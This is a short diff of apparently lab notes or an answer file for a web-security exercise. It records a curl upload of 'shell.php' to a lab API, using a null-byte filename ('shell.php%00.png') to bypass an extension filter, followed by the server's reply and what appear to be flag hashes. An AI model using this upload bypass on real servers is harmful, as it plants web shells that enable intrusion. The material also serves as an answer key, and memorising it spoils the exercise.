@@ -16,3 +16,10 @@ curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
 94f3390ef2068a67324f3a97e0e81bdc 
 
 
+2:
+curl -s -X POST http://test-s3.web0x05.hbtn/api/task2/ \
+  -F "file=@shell.php;filename=shell.php%00.png"
+{"message":"'/static/upload/shell.php' uploaded successfully."}
+
+http://test-s3.web0x05.hbtn/static/upload/shell.php
+8a22fa2b915a9110337ff5fd8f12779c
